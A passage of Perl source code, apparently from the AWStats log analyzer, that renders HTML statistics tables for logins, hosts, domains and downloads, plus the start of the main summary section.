= 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tprint \"$Center<a name=\\\"logins\\\">&nbsp;</a><br />\\n\";\n\tmy $title = '';\n\tif ( $HTMLOutput{'alllogins'} )  { $title .= \"$Message[94]\"; }\n\tif ( $HTMLOutput{'lastlogins'} ) { $title .= \"$Message[9]\"; }\n\t&tab_head( \"$title\", 19, 0, 'logins' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[94] : \"\n\t  . Format_Number(( scalar keys %_login_h )) . \"</th>\";\n\t&HTMLShowUserInfo('__title__');\n\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\t$total_p = $total_h = $total_k = 0;\n\tmy $count = 0;\n\tif ( $HTMLOutput{'alllogins'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},\n\t\t\t\\%_login_h, \\%_login_p );\n\t}\n\tif ( $HTMLOutput{'lastlogins'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},\n\t\t\t\\%_login_h, \\%_login_l );\n\t}\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">$key</td>\";\n\t\t&HTMLShowUserInfo($key);\n\t\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_login_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_login_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_login_l{$key}\n\t\t\t\t? Format_Date( $_login_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_login_p{$key} || 0;\n\t\t$total_h += $_login_h{$key};\n\t\t$total_k += $_login_k{$key} || 0;\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalPages - $total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other logins and/or anonymous\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[125]</span></td>\";\n\t\t&HTMLShowUserInfo('');\n\t\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Unknown IP/Host details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowHostsUnknown{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tprint \"$Center<a name=\\\"unknownip\\\">&nbsp;</a><br />\\n\";\n\t&tab_head( \"$Message[45]\", 19, 0, 'unknownwip' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\"\n\t  . Format_Number(( scalar keys %_host_h ))\n\t  . \" $Message[1]</th>\";\n\t&HTMLShowHostInfo('__title__');\n\tif ( $ShowHostsStats =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\t$total_p = $total_h = $total_k = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \\%_host_h,\n\t\t\\%_host_p );\n\tforeach my $key (@keylist) {\n\t\tmy $host = CleanXSS($key);\n\t\tprint \"<tr><td class=\\\"aws\\\">$host</td>\";\n\t\t&HTMLShowHostInfo($key);\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_host_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_host_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_host_l{$key}\n\t\t\t\t? Format_Date( $_host_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_host_p{$key};\n\t\t$total_h += $_host_h{$key};\n\t\t$total_k += $_host_k{$key} || 0;\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalPages - $total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other visitors (known or not)\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[82]</span></td>\";\n\t\t&HTMLShowHostInfo('');\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) { print \"<td>\".Format_Number($rest_h).\"</td>\"; }\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Host details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowHosts{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tprint \"$Center<a name=\\\"hosts\\\">&nbsp;</a><br />\\n\";\n\n\t# Show filter form\n\t&HTMLShowFormFilter( \"hostfilter\", $FilterIn{'host'},\n\t\t$FilterEx{'host'} );\n\n\t# Show hosts list\n\tmy $title = '';\n\tmy $cpt   = 0;\n\tif ( $HTMLOutput{'allhosts'} ) {\n\t\t$title .= \"$Message[81]\";\n\t\t$cpt = ( scalar keys %_host_h );\n\t}\n\tif ( $HTMLOutput{'lasthosts'} ) {\n\t\t$title .= \"$Message[9]\";\n\t\t$cpt = ( scalar keys %_host_h );\n\t}\n\t&tab_head( \"$title\", 19, 0, 'hosts' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\";\n\tif ( $FilterIn{'host'} || $FilterEx{'host'} ) {    # With filter\n\t\tif ( $FilterIn{'host'} ) {\n\t\t\tprint \"$Message[79] '<b>$FilterIn{'host'}</b>'\";\n\t\t}\n\t\tif ( $FilterIn{'host'} && $FilterEx{'host'} ) { print \" - \"; }\n\t\tif ( $FilterEx{'host'} ) {\n\t\t\tprint \" Exclude $Message[79] '<b>$FilterEx{'host'}</b>'\";\n\t\t}\n\t\tif ( $FilterIn{'host'} || $FilterEx{'host'} ) { print \": \"; }\n\t\tprint \"$cpt $Message[81]\";\n\t\tif ( $MonthRequired ne 'all' ) {\n\t\t\tif ( $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} ) {\n\t\t\t\tprint\n\"<br />$Message[102]: \".Format_Number($TotalHostsKnown).\" $Message[82], \".Format_Number($TotalHostsUnknown).\" $Message[1] - \".Format_Number($TotalUnique).\" $Message[11]\";\n\t\t\t}\n\t\t}\n\t}\n\telse {    # Without filter\n\t\tif ( $MonthRequired ne 'all' ) {\n\t\t\tprint\n\"$Message[102] : \".Format_Number($TotalHostsKnown).\" $Message[82], \".Format_Number($TotalHostsUnknown).\" $Message[1] - \".Format_Number($TotalUnique).\" $Message[11]\";\n\t\t}\n\t\telse { print \"$Message[102] : \" . Format_Number(( scalar keys %_host_h )); }\n\t}\n\tprint \"</th>\";\n\t&HTMLShowHostInfo('__title__');\n\tif ( $ShowHostsStats =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\t$total_p = $total_h = $total_k = 0;\n\tmy $count = 0;\n\tif ( $HTMLOutput{'allhosts'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \\%_host_h,\n\t\t\t\\%_host_p );\n\t}\n\tif ( $HTMLOutput{'lasthosts'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \\%_host_h,\n\t\t\t\\%_host_l );\n\t}\n\tmy $regipv4=qr/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/;\n\n\tif ( $DynamicDNSLookup == 2 ) {\n\t\t# Use static DNS file\n\t\t&Read_DNS_Cache( \\%MyDNSTable, \"$DNSStaticCacheFile\", \"\", 1 );\n\t}\n\n\tforeach my $key (@keylist) {\n\t\tmy $host = CleanXSS($key);\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . ( $_robot_l{$key} ? '<b>'  : '' ) . \"$host\"\n\t\t  . ( $_robot_l{$key} ? '</b>' : '' );\n\n\t\tif ($DynamicDNSLookup) {\n\t\t\t# Dynamic reverse DNS lookup\n        \t        if ($host =~ /$regipv4/o) {\n                \t        my $lookupresult=lc(gethostbyaddr(pack(\"C4\",split(/\\./,$host)),AF_INET));       # This may be slow\n                        \tif (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {\n\t\t\t\t\tif ( $DynamicDNSLookup == 2 ) {\n\t\t\t\t\t\t# Check static DNS file\n\t\t\t\t\t\t$lookupresult = $MyDNSTable{$host};\n\t\t\t\t\t\tif ($lookupresult) { print \" ($lookupresult)\"; }\n\t\t\t\t\t\telse { print \"\"; }\n\t\t\t\t\t}\n\t\t\t\t\telse { print \"\"; }\n\t                        }\n        \t                else { print \" ($lookupresult)\"; }\n\t                }\n\t\t}\n\n\t\tprint \"</td>\";\n\t\t&HTMLShowHostInfo($key);\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_host_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_host_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_host_l{$key}\n\t\t\t\t? Format_Date( $_host_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_host_p{$key};\n\t\t$total_h += $_host_h{$key};\n\t\t$total_k += $_host_k{$key} || 0;\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalPages - $total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other visitors (known or not)\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\t&HTMLShowHostInfo('');\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) { print \"<td>\".Format_Number($rest_h).\"</td>\"; }\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Domains details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowDomains{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $total_v = 0;\n\tmy $total_u = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tmy $rest_v = 0;\n\tmy $rest_u = 0;\n\tprint \"$Center<a name=\\\"domains\\\">&nbsp;</a><br />\\n\";\n\n\t# Show domains list\n\tmy $title = '';\n\tmy $cpt   = 0;\n\tif ( $HTMLOutput{'alldomains'} ) {\n\t\t$title .= \"$Message[25]\";\n\t\t$cpt = ( scalar keys %_domener_h );\n\t}\n\t&tab_head( \"$title\", 19, 0, 'domains' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"$WIDTHCOLICON\\\">&nbsp;</th><th colspan=\\\"2\\\">$Message[17]</th>\";\n\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_u\\\" width=\\\"80\\\">$Message[11]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_v\\\" width=\\\"80\\\">$Message[10]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tprint \"<th>&nbsp;</th>\";\n\tprint \"</tr>\\n\";\n\t$total_u = $total_v = $total_p = $total_h = $total_k = 0;\n\tmy $max_h = 1;\n\tforeach ( values %_domener_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\tmy $max_k = 1;\n\tforeach ( values %_domener_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_domener_h,\n\t\t\\%_domener_p );\n\tforeach my $key (@keylist) {\n\t\tmy ( $_domener_u, $_domener_v );\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;\n\t\t}    # use max_h to enable to compare pages with hits\n\t\tif ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h =\n\t\t\t  int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k =\n\t\t\t  int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +\n\t\t\t  1;\n\t\t}\n\t\tif ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }\n\t\tmy $newkey = lc($key);\n\t\tif ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {\n\t\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\"><img src=\\\"$DirIcons\\/flags\\/ip.png\\\" height=\\\"14\\\"\"\n\t\t\t  . AltTitle(\"$Message[0]\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$Message[0]</td><td>$newkey</td>\";\n\t\t}\n\t\telse {\n\t\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\"><img src=\\\"$DirIcons\\/flags\\/$newkey.png\\\" height=\\\"14\\\"\"\n\t\t\t  . AltTitle(\"$newkey\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$DomainsHashIDLib{$newkey}</td><td>$newkey</td>\";\n\t\t}\n\t\t## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE\n\t\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\t\t$_domener_u = (\n\t\t\t\t  $_domener_p{$key}\n\t\t\t\t? $_domener_p{$key} / $TotalPages\n\t\t\t\t: 0\n\t\t\t);\n\t\t\t$_domener_u += ( $_domener_h{$key} / $TotalHits );\n\t\t\t$_domener_u =\n\t\t\t  sprintf( \"%.0f\", ( $_domener_u * $TotalUnique ) / 2 );\n\t\t\tprint \"<td>\".Format_Number($_domener_u).\" (\"\n\t\t\t  . sprintf( \"%.1f%\", 100 * $_domener_u / $TotalUnique )\n\t\t\t  . \")</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\t\t$_domener_v = (\n\t\t\t\t  $_domener_p{$key}\n\t\t\t\t? $_domener_p{$key} / $TotalPages\n\t\t\t\t: 0\n\t\t\t);\n\t\t\t$_domener_v += ( $_domener_h{$key} / $TotalHits );\n\t\t\t$_domener_v =\n\t\t\t  sprintf( \"%.0f\", ( $_domener_v * $TotalVisits ) / 2 );\n\t\t\tprint \"<td>\".Format_Number($_domener_v).\" (\"\n\t\t\t  . sprintf( \"%.1f%\", 100 * $_domener_v / $TotalVisits )\n\t\t\t  . \")</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\t\tprint \"<td>\".Format_Number($_domener_p{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_domener_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_domener_k{$key} ) . \"</td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\t\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle( \"$Message[56]: \" . int( $_domener_p{$key} ) )\n\t\t\t  . \" /><br />\\n\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle( \"$Message[57]: \" . int( $_domener_h{$key} ) )\n\t\t\t  . \" /><br />\\n\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hk'}\\\" width=\\\"$bredde_k\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle(\n\t\t\t\t\"$Message[75]: \" . Format_Bytes( $_domener_k{$key} ) )\n\t\t\t  . \" />\";\n\t\t}\n\t\tprint \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_u += $_domener_u;\n\t\t$total_v += $_domener_v;\n\t\t$total_p += $_domener_p{$key};\n\t\t$total_h += $_domener_h{$key};\n\t\t$total_k += $_domener_k{$key} || 0;\n\t\t$count++;\n\t}\n\tmy $rest_u = $TotalUnique - $total_u;\n\tmy $rest_v = $TotalVisits - $total_v;\n\t$rest_p = $TotalPages - $total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif (   $rest_u > 0\n\t\t|| $rest_v > 0\n\t\t|| $rest_p > 0\n\t\t|| $rest_h > 0\n\t\t|| $rest_k > 0 )\n\t{    # All other domains (known or not)\n\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\">&nbsp;</td><td colspan=\\\"2\\\" class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowDomainsStats =~ /U/i ) { print \"<td>$rest_u</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /V/i ) { print \"<td>$rest_v</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /P/i ) { print \"<td>$rest_p</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /H/i ) { print \"<td>$rest_h</td>\"; }\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">&nbsp;</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Downloads code frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowDownloads{\n\tmy $regext         = qr/\\.(\\w{1,6})$/;\n\tprint \"$Center<a name=\\\"downloads\\\">&nbsp;</a><br />\\n\";\n\t&tab_head( $Message[178], 19, 0, \"downloads\" );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[178]</th>\";\n\tif ( $ShowFileTypesStats =~ /H/i ){print \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\"\n\t\t.\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">206 $Message[57]</th>\"; }\n\tif ( $ShowFileTypesStats =~ /B/i ){\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $count = 0;\n\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\tprint \"<tr>\";\n\t\tmy $ext = Get_Extension($regext, $u);\n\t\tif ( !$ext) {\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $nameicon = $MimeHashLib{$ext}[0] || \"notavailable\";\n\t\t\tmy $nametype = $MimeHashFamily{$MimeHashLib{$ext}[0]} || \"&nbsp;\";\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($u);\n\t\tprint \"</td>\";\n\t\tif ( $ShowFileTypesStats =~ /H/i ){\n\t\t\tprint \"<td>\".Format_Number($_downloads{$u}->{'AWSTATS_HITS'}).\"</td>\";\n\t\t\tprint \"<td>\".Format_Number($_downloads{$u}->{'AWSTATS_206'}).\"</td>\";\n\t\t}\n\t\tif ( $ShowFileTypesStats =~ /B/i ){\n\t\t\tprint \"<td>\".Format_Bytes($_downloads{$u}->{'AWSTATS_SIZE'}).\"</td>\";\n\t\t\tprint \"<td>\".Format_Bytes(($_downloads{$u}->{'AWSTATS_SIZE'}/\n\t\t\t\t\t($_downloads{$u}->{'AWSTATS_HITS'} + $_downloads{$u}->{'AWSTATS_206'}))).\"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t\tif ($count >= $MaxRowsInHTMLOutput){last;}\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Summary section at the top of the main page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainSummary{\n\tif ($Debug) { debug( \"ShowSummary\", 2 ); }\n\t# FirstTime LastTime\n\tmy $FirstTime = 0;\n\tmy $LastTime  = 0;\n\tforeach my $key ( keys %FirstTime ) {\n\t\tmy $keyqualified = 0;\n\t\tif ( $MonthRequired eq 'all' ) { $keyqualified = 1; }\n\t\tif ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }\n\t\tif ($keyqualified) {\n\t\t\tif ( $FirstTime{$key}\n\t\t\t\t&& ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )\n\t\t\t{\n\t\t\t\t$FirstTime = $FirstTime{$key};\n\t\t\t}\n\t\t\tif ( $LastTime < ( $LastTime{$key} || 0 ) ) {\n\t\t\t\t$LastTime = $LastTime{$key};\n\t\t\t}\n\t\t}\n\t}\n\t\t\t\n\t#print \"$Center<a name=\\\"summary\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[128]\";\n\t&tab_head( \"$title\", 0, 0, 'month' );\n\n\tmy $NewLinkParams = ${QueryString};\n\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ 